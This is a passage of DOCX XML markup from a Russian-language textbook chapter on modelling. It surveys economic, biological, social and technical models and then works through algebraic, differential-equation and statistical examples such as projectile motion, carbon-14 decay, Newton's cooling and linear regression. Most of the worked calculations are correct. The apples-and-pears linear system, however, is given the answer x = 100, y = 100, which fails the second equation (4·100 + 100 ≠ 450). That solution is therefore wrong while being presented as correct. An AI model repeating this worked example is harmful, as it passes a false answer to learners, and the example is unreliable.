        <w:t>Модель "спрос-предложение" (supply-demand)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Модель инфляции</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Модель дисконтированного денежного потока (DCF) — оценка стоимости бизнеса</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4. Биологические модели</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Описывают живые организмы, популяции, экосистемы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Модель роста популяции (экспоненциальный, логистический рост)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Модель "хищник-жертва" (уравнения Лотки-Вольтерры)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Модель распространения эпидемии (SIR-модель)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>5. Социальные модели</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Описывают социальные процессы: распространение информации, мнений, поведение толпы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Модель распространения слухов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Модель голосования (как люди принимают решение на выборах)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Модель социальной сети (граф, узлы = люди, рёбра = дружба)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>6. Технические модели</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Описывают работу технических систем: компьютеры, сети, алгоритмы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Модель работы процессора (архитектура фон Неймана)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Модель сетевого протокола (модель OSI, глава 8.7)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Алгоритмы сортировки (блок-схемы, сложность O(n²), O(n log n))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.3.2. Математические модели: основные типы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Математические модели — это описание системы с помощью </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>формул, уравнений, функций</w:t>
      </w:r>
      <w:r>
        <w:t>. Они составляют основу всей современной науки и техники.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Математические модели бывают разных типов в зависимости от используемого математического аппарата.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Алгебраические модели</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алгебраическая модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это модель, представленная в виде </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>алгебраических уравнений</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (без производных, без интегралов, без дифференциалов).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1.1. Линейное уравнение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Модель зависимости одной величины от другой:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>y = a × x + b</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Модель заработной платы.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Зарплата = фиксированная часть + процент от продаж.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Зарплата = 20 000 ₽ + 0.05 × Продажи</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Если продажи = 100 000 ₽, то зарплата = 20 000 + 5 000 = 25 000 ₽.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1.2. Система линейных уравнений</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Модель с несколькими неизвестными.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Задача про яблоки и груши.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>2 кг яблок + 3 кг груш = 500 ₽</w:t>
        <w:br/>
        <w:t>4 кг яблок + 1 кг груш = 450 ₽</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Система уравнений:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>2x + 3y = 500</w:t>
        <w:br/>
        <w:t>4x + 1y = 450</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Решаем (методом подстановки, методом Крамера, или на калькуляторе):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>x = 100 ₽ (цена 1 кг яблок)</w:t>
        <w:br/>
        <w:t>y = 100 ₽ (цена 1 кг груш)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1.3. Квадратное уравнение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Модель движения тела с ускорением:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>h(t) = h₀ + v₀×t - (g×t²)/2</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>где:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`h(t)` — высота в момент времени `t`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`h₀` — начальная высота</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`v₀` — начальная скорость</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`g` — ускорение свободного падения (≈9.8 м/с²)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Камень брошен вверх с высоты 10 м со скоростью 20 м/с. Через сколько секунд упадёт на землю?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>h(t) = 10 + 20t - 4.9t²</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Камень упадёт, когда `h(t) = 0`:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>10 + 20t - 4.9t² = 0</w:t>
        <w:br/>
        <w:t>-4.9t² + 20t + 10 = 0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Решаем квадратное уравнение (через дискриминант):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>t = (-b ± √(b² - 4ac)) / 2a</w:t>
        <w:br/>
        <w:t>t = (-20 ± √(400 + 196)) / (-9.8)</w:t>
        <w:br/>
        <w:t>t = (-20 ± √596) / (-9.8)</w:t>
        <w:br/>
        <w:t>t = (-20 ± 24.4) / (-9.8)</w:t>
        <w:br/>
        <w:br/>
        <w:t>t₁ = (-20 + 24.4) / (-9.8) ≈ -0.45 (отрицательное время, нет смысла)</w:t>
        <w:br/>
        <w:t>t₂ = (-20 - 24.4) / (-9.8) ≈ 4.53 секунды</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Камень упадёт через ~4.5 секунды.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. Дифференциальные уравнения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дифференциальное уравнение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это уравнение, которое связывает функцию с её </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>производными</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (скоростью изменения).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Короче, если алгебраическая модель говорит "что есть сейчас", то дифференциальное уравнение говорит "</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как это меняется</w:t>
      </w:r>
      <w:r>
        <w:t>".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем нужны:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Для описания процессов изменения во времени — рост населения, распад радиоактивного вещества, распространение тепла, движение тела.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2.1. Модель радиоактивного распада</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Скорость распада пропорциональна количеству вещества:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>dN/dt = -λ × N</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>где:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`N(t)` — количество радиоактивного вещества в момент времени `t`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`λ` — константа распада</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`dN/dt` — скорость изменения количества</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Решение этого уравнения:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>N(t) = N₀ × e^(-λt)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Период полураспада углерода-14 составляет 5730 лет. Сколько останется вещества через 10 000 лет, если начальное количество `N₀ = 100 г`?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Константа распада:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>λ = ln(2) / T_{1/2} = 0.693 / 5730 ≈ 0.000121 год⁻¹</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Через 10 000 лет:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>N(10000) = 100 × e^(-0.000121 × 10000)</w:t>
        <w:br/>
        <w:t>N(10000) = 100 × e^(-1.21)</w:t>
        <w:br/>
        <w:t>N(10000) ≈ 100 × 0.298 ≈ 29.8 г</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Останется примерно 30 г вещества.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2.2. Модель остывания тела (закон Ньютона)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Скорость остывания пропорциональна разности температур тела и окружающей среды:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>dT/dt = -k × (T - T_окр)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>где:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`T(t)` — температура тела в момент времени `t`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`T_окр` — температура окружающей среды</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`k` — коэффициент теплообмена</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>T(t) = T_окр + (T₀ - T_окр) × e^(-kt)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Чашка кофе остывает. Начальная температура 90°C, температура комнаты 20°C, коэффициент `k = 0.1 мин⁻¹`. Какая будет температура через 10 минут?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>T(10) = 20 + (90 - 20) × e^(-0.1 × 10)</w:t>
        <w:br/>
        <w:t>T(10) = 20 + 70 × e^(-1)</w:t>
        <w:br/>
        <w:t>T(10) = 20 + 70 × 0.368</w:t>
        <w:br/>
        <w:t>T(10) ≈ 20 + 25.8 ≈ 45.8°C</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Через 10 минут температура кофе будет около 46°C (уже не горячий, но ещё тёплый).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. Статистические модели</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Статистическая модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это модель, которая описывает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>зависимость между переменными</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> на основе данных. Используются методы математической статистики: корреляция, регрессия, анализ данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3.1. Линейная регрессия</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Модель для прогнозирования зависимости одной переменной от другой.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>y = a × x + b + ε</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>где `ε` — случайная ошибка (шум).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Модель зависимости продаж от рекламного бюджета.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Данные:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Реклама (тыс. ₽) | Продажи (тыс. ₽) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| ---------------- | ---------------- |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 10               | 120              |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 20               | 150              |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 30               | 180              |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 40               | 210              |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 50               | 240              |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Методом наименьших квадратов (МНК) находим коэффициенты:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>y = 3x + 90</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Прогноз:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Если потратим на рекламу 60 тыс. ₽, то продажи составят:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>y = 3 × 60 + 90 = 180 + 90 = 270 тыс. ₽</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важно:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>статистическая модель</w:t>
      </w:r>
      <w:r>
        <w:t>, а не детерминированная. Реальные продажи могут быть 260 тыс. или 280 тыс., потому что есть случайные факторы (сезонность, конкуренты, настроение покупателей).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3.2. Корреляция</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Корреляция показывает, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>насколько связаны</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> две переменные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Коэффициент корреляции Пирсона:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>r = cov(X, Y) / (σ_X × σ_Y)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>где:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`cov(X, Y)` — ковариация (мера совместной изменчивости)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`σ_X`, `σ_Y` — стандартные отклонения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Значения:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`r = +1` — идеальная положительная корреляция (чем больше X, тем больше Y)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`r = 0` — нет корреляции (X и Y независимы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`r = -1` — идеальная отрицательная корреляция (чем больше X, тем меньше Y)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Корреляция между температурой на улице и продажами мороженого.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>r ≈ +0.85 (сильная положительная корреляция)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Интерпретация: чем выше температура, тем больше продаж мороженого.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4. Модели теории вероятностей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вероятностная модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> описывает случайные события и их вероятности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
